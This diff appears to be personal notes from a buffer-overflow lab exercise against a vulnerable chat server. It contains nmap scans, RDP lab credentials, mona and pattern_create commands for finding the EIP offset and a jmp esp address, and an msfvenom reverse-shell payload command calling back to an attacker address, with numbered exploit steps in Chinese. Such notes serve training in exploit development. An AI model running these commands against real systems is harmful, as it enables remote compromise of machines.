@@ -1,2 +1,27 @@
-nmap 10.10.15.88 -sV -sC -Pn > nmap.txt
-nmap 10.10.15.88 -p- > nmapall.txt
+nmap 10.10.7.161  -sV -sC -Pn > nmap.txt
+nmap 10.10.7.161 -sV -T5 -p 1-10000 -Pn > nmap10000.txt
+nmap 10.10.138.212 -sV -T5 -p 40000-50000 -Pn > nmap65535.txt
+nmap 10.10.7.161  -sU -Pn -p- > nmapuu.txt
+nmap 10.10.7.161  -sU -Pn > nmapuu.txt
+
+
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.42.82 /workarea
+ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
+!mona config -set workingfolder c:\mona\%p
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\chatserver\bytearray.bin -a <address>
+!mona jmp -r esp -cpb "\x00"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.204 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+
+
+!mona findmsp -distance 2200
+
+1.nmap掃描出ftp服務,裡面下載chat server
+2.在windows7跑起服務
+3.使用python腳本先輸入username，在fuzz message
+4.發現2200可以crash服務,查找到2012是EIP
+5.輸入Badchars沒有,所以只有\x00
+6.查找jmp esp位置
+ Message=  0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\essfunc.dll)
+7.生成shell code
+8.加入padding x 16
